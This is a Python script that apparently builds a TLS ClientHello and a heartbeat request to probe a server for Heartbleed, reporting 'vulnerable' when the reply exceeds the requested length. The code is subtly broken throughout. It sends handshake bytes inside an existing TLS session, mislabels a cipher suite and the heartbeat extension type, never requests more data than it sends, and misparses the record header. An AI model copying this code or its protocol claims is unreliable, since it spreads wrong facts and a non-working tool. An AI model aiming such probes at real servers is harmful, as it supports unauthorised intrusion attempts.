import socket
import ssl
import struct
import certifi

def create_client_hello():
    """
    Constructs a minimal ClientHello message.
    Note: This is a simplified version and may not work with all servers.
    """
    # TLS Record Header
    content_type = 22  # Handshake
    version = (3, 3)  # TLS 1.2
    # Placeholder for length, will calculate later
    client_hello = struct.pack('!BHH', content_type, (version[0] << 8) | version[1], 0)

    # Handshake Protocol
    handshake_type = 1  # ClientHello
    # Placeholder for length, will calculate later
    handshake = struct.pack('!B', handshake_type) + struct.pack('!I', 0)[1:]

    # ClientHello Fields
    # Version
    client_version = struct.pack('!H', (version[0] << 8) | version[1])

    # Random (32 bytes)
    random_bytes = b'\x00' * 32

    # Session ID
    session_id = b'\x00'

    # Cipher Suites
    cipher_suites = struct.pack('!H', 0x0033)  # TLS_AES_256_GCM_SHA384 as an example

    # Compression Methods
    compression_methods = b'\x01\x00'  # No compression

    # Extensions
    extensions = struct.pack('!HH', 0x0000, 0x000A)  # Heartbeat extension
    # Heartbeat extension
    hb_extension = struct.pack('!B', 1)  # Heartbeat mode: peer allowed to send requests
    extensions += struct.pack('!H', 0x000F) + struct.pack('!B', 1) + hb_extension

    # Combine all parts
    client_hello_body = client_version + random_bytes + session_id + struct.pack('!B', len(cipher_suites)) + cipher_suites + struct.pack('!B', len(compression_methods)) + compression_methods + struct.pack('!H', len(extensions)) + extensions

    # Update handshake length
    handshake = struct.pack('!B', handshake_type) + struct.pack('!I', len(client_hello_body))[1:] + client_hello_body

    # Update record length
    record_length = len(handshake)
    client_hello = struct.pack('!BHH', content_type, (version[0] << 8) | version[1], record_length) + handshake

    return client_hello

def create_heartbeat(payload_length=64):
    """
    Constructs a Heartbeat request message.

    Args:
        payload_length (int): The length of the payload to request.

    Returns:
        bytes: The serialized Heartbeat message.
    """
    hb_type = 1  # Heartbeat request
    payload = b'A' * payload_length
    padding = b'\x00' * 16
    hb_length = len(payload)
    heartbeat = struct.pack('!BHH', hb_type, 1, hb_length) + payload + padding
    return heartbeat

def send_heartbeat(hostname, port):
    """
    Connects to the server, sends a Heartbeat request, and analyzes the response.

    Args:
        hostname (str): The server's hostname or IP address.
        port (int): The server's port number.

    Returns:
        None
    """
    # Create an SSL context for TLS 1.2 using certifi's CA bundle
    context = ssl.create_default_context(cafile=certifi.where())
    context.minimum_version = ssl.TLSVersion.TLSv1_2

    try:
        # Establish a TCP connection
        with socket.create_connection((hostname, port), timeout=10) as sock:
            # Wrap the socket with SSL
            with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                print(f"Connected to {hostname}:{port} using {ssock.version()}")
                cipher = ssock.cipher()
                print(f"Cipher Suite: {cipher}")

                # Send ClientHello
                client_hello = create_client_hello()
                ssock.sendall(client_hello)
                print("Sent ClientHello")

                # Receive ServerHello and other handshake messages
                response = ssock.recv(4096)
                print(f"Received {len(response)} bytes of handshake data")

                # Send Heartbeat request
                heartbeat = create_heartbeat(payload_length=64)
                ssock.sendall(heartbeat)
                print("Sent Heartbeat request")

                # Receive Heartbeat response
                hb_response = ssock.recv(4096)
                print(f"Received {len(hb_response)} bytes of Heartbeat response")

                # Analyze Heartbeat response
                if len(hb_response) > 0:
                    try:
                        # Parse the TLS Record Header
                        content_type, version_major, version_minor, length = struct.unpack('!BHHH', hb_response[:5])
                        print(f"Content Type: {content_type}, Version: {version_major}.{version_minor}, Length: {length}")

                        # Parse the Heartbeat message
                        hb_type, hb_length = struct.unpack('!BH', hb_response[5:8])
                        print(f"Heartbeat Type: {hb_type}, Payload Length: {hb_length}")

                        payload = hb_response[8:8+hb_length]
                        print(f"Payload: {payload}")

                        if hb_length > 64:
                            print("SUCCESS! Server is vulnerable to Heartbleed.")
                            return "vulnerable"
                        else:
                            print("FAILURE! Server responded correctly.")
                            return "secure"
                    except struct.error as e:
                        print(f"Error parsing Heartbeat response: {e}")
                        return "secure"
                else:
                    print("No Heartbeat response received.")
                    return "no_response"

    except ssl.SSLError as e:
        print(f"SSL error occurred: {e}")
        return "no_response"
    except socket.error as e:
        print(f"Socket error occurred: {e}")
        return "no_response"
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
        return "no_response"
